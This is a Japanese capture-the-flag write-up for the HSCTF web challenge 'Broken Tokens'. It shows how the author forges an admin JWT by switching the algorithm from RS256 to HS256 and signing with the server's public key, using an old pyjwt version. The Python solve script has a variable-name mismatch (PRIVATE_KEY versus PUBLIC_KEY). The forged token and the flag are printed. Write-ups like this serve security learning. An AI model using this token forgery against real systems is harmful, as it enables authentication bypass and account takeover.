# Broken Tokens

100pt (335 Solves)

```txt
I made a login page, is it really secure? https://broken-tokens.web.hsctf.com/

Note: If you receive an "Internal Server Error" (HTTP Status Code 500), that means that your cookie is incorrect.

Author: hmmm
```

## 添付

- [main.py](./attachments/main.py)

## 概要

![login](../img/Broken_Tokens.png)  

- ログインページ: `/`  
適当なID、Passでログインすると`Logged in as guest`と表示される。  
  - publickey.pem: `/publickey.pem`  
  publickkeyが書いてある。これを使えってことだろう。

ログインしたら以下のようなCookieがセットされ、変に弄ったら`InternalServerError`になる。  

```txt
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJhdXRoIjoiZ3Vlc3QifQ.e3UX6vGuTGHWouov4s5HuKn6B5zbe0ZjxwHCB_OQlX_TcntJuj89x0RDi8gQi88TMoXSFN-qnFUQxillB_nD5ErrVZKL8HI5Ah_iQBX1xfu097H2xT3LAhDEceq4HDEQY-iC4TVSxMGM0AS_ItsVLBIrxk8tapcANvCW_KnO3mEFwfQOD64YHtapSZJ-kKjdN19lgdI_g-2nNI83P6TlgLtZ8vo1BB1zt_8b4UECSiPb67YCsrCYIIsABq5UyxSwgUpZsM6oxW0k1c4NbaUTnUWURG2qWDVw56svRQETU3YjO59AMj67n9r9Y9NJ9FBlpHQ60Ck-mfL5JcmFE9sgVw
```

`.`区切りで最初2つをbase64デコードすると`{"typ":"JWT","alg":"RS256"}`、`{"auth":"guest"}`。  
脳死で`{"auth":"admin"}`に書き換えたが署名があるからか、InternalServerErrorになる。

## 解

[main.py](./attachments/main.py)を見ながら調べてたら、  
攻撃者が署名したトークンで認証を通過できるという記事を見つけた。  

アルゴリズムを`RS256`から`HS256`に書き換えればできるっぽい。公開鍵を手元に保存しておく。

`pip install pyjwt==0.4.3`で古いjwtパッケージをインストールして、以下を実行

```python
import jwt

with open("publickey.pem", "r") as f:
        PRIVATE_KEY = f.read()

print (jwt.encode({"auth": "admin"}, PUBLIC_KEY, algorithm="HS256"))
```

```shell
$ python3 solve.py
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiYWRtaW4ifQ.MfoiS9XkQHMOw2Y6uQJrw0gM2NUfGYM-1Sz-SzKvad4'
```

`eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdXRoIjoiYWRtaW4ifQ.MfoiS9XkQHMOw2Y6uQJrw0gM2NUfGYM-1Sz-SzKvad4`をcookieにセットし、ページを更新すればflag。

```txt
flag{1n53cur3_tok3n5_5474212}
```
